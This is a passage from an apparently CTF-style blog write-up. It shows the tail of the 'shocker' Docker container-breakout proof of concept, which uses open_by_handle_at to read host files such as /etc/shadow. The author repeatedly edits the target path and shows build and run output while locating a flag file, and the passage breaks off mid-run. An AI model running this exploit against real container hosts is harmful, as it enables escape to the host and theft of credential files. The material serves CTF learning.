</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] Cannot find valid handle!&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Got a final handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">dump_handle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">h</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd2</span> <span class="o">=</span> <span class="n">open_by_handle_at</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file_handle</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">h</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] open_by_handle&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] read&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Win! /etc/shadow output follows:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like it&rsquo;s a simple case of replacing the following line with the file to read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I thought I could be sneaky here and request /root/flag.txt, so I edited the source code, and compiled it as per the instructions</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.4 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; b1c818249f2f
</span><span class='line'>Removing intermediate container 80d78a2e42ff
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in b670431898c9
</span><span class='line'> ---&gt; a8aea5e1a755
</span><span class='line'>Removing intermediate container b670431898c9
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in a19ed14d76b6
</span><span class='line'> ---&gt; 391372de38ec
</span><span class='line'>Removing intermediate container a19ed14d76b6
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in 1572b7cb39e5
</span><span class='line'> ---&gt; 6a588733f8ce
</span><span class='line'>Removing intermediate container 1572b7cb39e5
</span><span class='line'>Successfully built 6a588733f8ce
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found flag.txt
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: flag.txt <span class="nv">ino</span><span class="o">=</span>165017
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>flag.txt<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Got a final handle!
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Win! /root/flag.txt output follows:
</span><span class='line'>Errr, you are close, but this is not the flag you are looking <span class="k">for</span>.
</span><span class='line'>
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Wow, 1 it worked, and 2 this is not the flag you are looking for</p>

<p><img src="http://motorcycleradio.us/wp-content/uploads/2014/07/mindtrick.gif" alt="" /></p>

<p>I did notice, however, that it provides a directory listing when trying to find the file requested. There&rsquo;s a folder or file called 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc. I wonder if that is either the flag, or if the flag is in it ?</p>

<p>Firstly lets try requesting it as a file by changing the source code, compile and run it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.9 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; 4ccef4da8ae5
</span><span class='line'>Removing intermediate container 8cb273148a08
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in 661ce7955eae
</span><span class='line'> ---&gt; 66c9d4b419e6
</span><span class='line'>Removing intermediate container 661ce7955eae
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in 969fcb8e2910
</span><span class='line'> ---&gt; edd283652f36
</span><span class='line'>Removing intermediate container 969fcb8e2910
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in bbadcbb89ef2
</span><span class='line'> ---&gt; 41afb4ce762a
</span><span class='line'>Removing intermediate container bbadcbb89ef2
</span><span class='line'>Successfully built 41afb4ce762a
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc <span class="nv">ino</span><span class="o">=</span>138648
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Got a final handle!
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> <span class="nb">read</span>: Is a directory
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a directory, so we need to know the file name. If I request a random filename, I will still get a folder listing, so changing the source code to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>results in the following when compiled and run</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.9 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; 218b0633106e
</span><span class='line'>Removing intermediate container 2a354d2d7c4b
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in 957ed6b77fb3
</span><span class='line'> ---&gt; bbcee63e4d51
</span><span class='line'>Removing intermediate container 957ed6b77fb3
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in e283824b6a69
</span><span class='line'> ---&gt; 7e02f111f1eb
</span><span class='line'>Removing intermediate container e283824b6a69
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in ef8d73127be9
</span><span class='line'> ---&gt; f532278bdca2
</span><span class='line'>Removing intermediate container ef8d73127be9
</span><span class='line'>Successfully built f532278bdca2
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc <span class="nv">ino</span><span class="o">=</span>138648
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;random.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found real_flag.txt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found ..
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Cannot find valid handle!: Bad file descriptor
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our flag is actually called real_flag.txt, so a quick edit, compile and run, and we have the flag !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.9 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; c70bb87b476f
</span><span class='line'>Removing intermediate container 9dc4cbb04db9
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in 77dfcfa2bdd0
</span><span class='line'> ---&gt; e376b09e495d
</span><span class='line'>Removing intermediate container 77dfcfa2bdd0
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in 6d5d7089896d
</span><span class='line'> ---&gt; f3140f828bfc
</span><span class='line'>Removing intermediate container 6d5d7089896d
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in 481824a260cb
</span><span class='line'> ---&gt; 2c7032dcfbd2
</span><span class='line'>Removing intermediate container 481824a260cb
</span><span class='line'>Successfully built 2c7032dcfbd2
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
